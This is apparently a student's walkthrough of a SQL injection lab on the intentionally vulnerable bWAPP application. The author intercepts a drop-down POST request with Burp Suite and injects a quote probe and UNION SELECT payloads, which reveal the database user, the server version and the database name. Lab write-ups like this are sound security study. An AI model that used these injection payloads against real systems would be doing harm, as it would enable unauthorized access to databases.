## Page Content:

When we enter the page we see that it has a drop-down menu with movie names in it and beside it a "GO" button.
This means that since we have no way of entering a payload via an input field, we have to use burpsuite to intercept the request and send the payload that we want.

## First Trial:

When we press the "GO" button the request is intercepted and we are able to see the following information about the request:

>POST /bWAPP/sqli_13.php HTTP/1.1
>Host: 10.0.2.15
>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
>Accept-Language: en-US,en;q=0.5
>Accept-Encoding: gzip, deflate
>Content-Type: application/x-www-form-urlencoded
>Content-Length: 17
>Origin: http://10.0.2.15
>Connection: close
>Referer: http://10.0.2.15/bWAPP/sqli_13.php
>Cookie: security_level=0; PHPSESSID=c7c802af852ff04134b2936991eba585
>movie=1&action=go

We are concerned with the last line which is the body of the request. So, we can inject the payload we wnt to execute there.

So, we can add a single quote to see the behaviour of the webpage; as follows:

> movie=1'&action=go

We get the following error message:

>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1

Which means that we are walking in the right path.

## Second Trial:

We can then look for the user of the database using the following alterations to the body of the request:

> movie=100 union select 1,user(),3,4,5,6,7-- #&action=go

We get the following respose crrying the user of the database:

> root@localhost

## Third Trial:

I tried getting the table names and the databases they belong to but the information that I got were not useful:

>information_schema   CHARACTER_SETS

## Fourth Trial:

Then I tried getting the version of the server and the database name:

> movie=100 union select 1,version(),database(),4,5,6,7-- #&action=go

The output that I got was the following:

+ The version:  5.0.96-0ubuntu3
+ The database: bWAPP

That is the most that we can get out of this vulnerability.